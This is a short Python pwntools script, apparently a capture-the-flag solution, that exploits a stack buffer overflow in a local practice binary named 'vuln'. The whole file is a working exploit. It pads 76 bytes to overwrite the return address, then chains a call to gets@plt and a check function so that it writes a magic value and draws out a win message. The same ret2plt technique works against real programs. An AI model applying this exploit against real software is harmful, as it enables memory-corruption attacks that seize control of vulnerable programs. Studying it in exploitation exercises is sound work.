from pwn import *
import struct
import time
elf = context.binary = ELF('./vuln', checksec=False)
p = process()

payload = b"A"*76 # offset before overwriting EIP backup
payload += struct.pack("I", 0x8049040) # gets@plt
payload += struct.pack("I", 0x8049182) # check function
payload += struct.pack("I", 0x0804c028) # args[0] of gets => target address
file = open("payload", "wb")
file.write(payload)

p.sendline(payload) # payload : gets(target); check();
time.sleep(1)
p.sendline(struct.pack("I", 0xb47ec0de)) # to get the win message
r = p.recvall();
print(str(r.decode("utf-8")))